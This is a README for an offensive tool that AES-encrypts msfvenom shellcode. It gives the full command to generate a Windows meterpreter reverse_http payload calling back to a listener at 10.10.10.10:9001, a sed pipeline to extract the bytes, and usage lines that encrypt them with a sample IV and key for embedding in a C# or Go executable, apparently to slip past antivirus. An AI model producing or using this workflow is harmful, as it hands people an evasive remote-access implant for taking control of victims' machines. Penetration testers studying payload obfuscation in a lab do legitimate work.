# AES Encryptor
A simple script to encrypt `msfvenom` payloads.

## Prerequisites

### Install dependencies 
Install `cryptography` library (recommended in a virtual environment):
```shell
# Optional: Create a virtual environment
python3 -m venv venv_crypto
source venv_crypto/bin/activate
# Install required library
pip3 install cryptography
```

### Generate payload with msfvenom
Use `msfvenom` to generate a payload:
```shell
msfvenom --arch x64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=9001 -f csharp -o bytesPayload
```

And extract its hex bytes (comma-separated):
```shell
cat bytesPayload | sed ':a;N;$!ba;s/\n//g' | sed -n 's/.*{\(.*\)}.*/\1/p' | sed 's/.$//'
```

## Usage
Use the previously generated payload into the script:
```shell-session
$ python3 aes_encryptor.py 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,<SNIP>
```
The program will generate a random `IV` and `AES Key` that will be displayed (and needed to decrypt the payload).

Alternatively, we can pass an `IV` value (must be `16` bytes long) and an `AES Key` (must be `16`, `24` or `32` bytes long):
```shell-session
$ python3 aes_encryptor.py  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,<SNIP> --iv c103a602fd0a103f4186a018014413b8 --key f559f175cf94696bf9c2cf118204fe7a
```
The generated ciphertext (encoded payload) will be shown as well as its `base64` format that can be used, along with the `IV` and `Aes Key`, in a `C#`, `Go` or your favorite language to build an executable (:

~Happy Hacking
